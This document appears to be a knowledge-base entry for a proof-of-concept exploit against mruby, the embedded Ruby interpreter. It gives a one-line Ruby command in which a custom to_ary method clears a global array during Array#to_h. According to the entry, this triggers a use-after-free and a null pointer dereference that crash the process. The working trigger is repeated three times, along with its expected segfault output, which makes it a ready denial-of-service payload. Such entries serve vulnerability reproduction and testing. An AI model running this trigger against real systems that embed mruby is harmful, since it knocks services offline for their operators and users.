---
data: 'class A; def to_ary; $a.clear; nil; end; end; $a=[A.new]; $a.to_h'
tags:
  - dos
  - uaf
  - poc
type: command
executor: ruby
platforms:
  - Embedded Ruby (mruby)
id: 0266182b-b6a0-4541-a6fd-30e68fabc3b4
created_at: '2025-12-14T17:26:48.771Z'
updated_at: '2025-12-14T17:26:48.771Z'
verified: false
validated: true
submitted: true
---
# mruby-dos-poc

## Command

```ruby
class A; def to_ary; $a.clear; nil; end; end; $a=[A.new]; $a.to_h
```

## Description

This command reproduces the DoS vulnerability by defining a custom class A that clears the global array $a in its to_ary method and then calling to_h on $a, triggering a use-after-free and null pointer dereference in mruby's array.c.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$a` | Global array cleared in to_ary | Yes |

## Examples

### Basic Usage

```ruby
class A; def to_ary; $a.clear; nil; end; end; $a=[A.new]; $a.to_h
```

### Advanced Usage

Integrate into larger script; run under GDB for analysis.

## Expected Output

Null memory access crash terminating mruby process, e.g., "Segmentation fault (core dumped)".

## Related

- [[Related Procedure: Trigger-UAF-via-to_h-Call]]
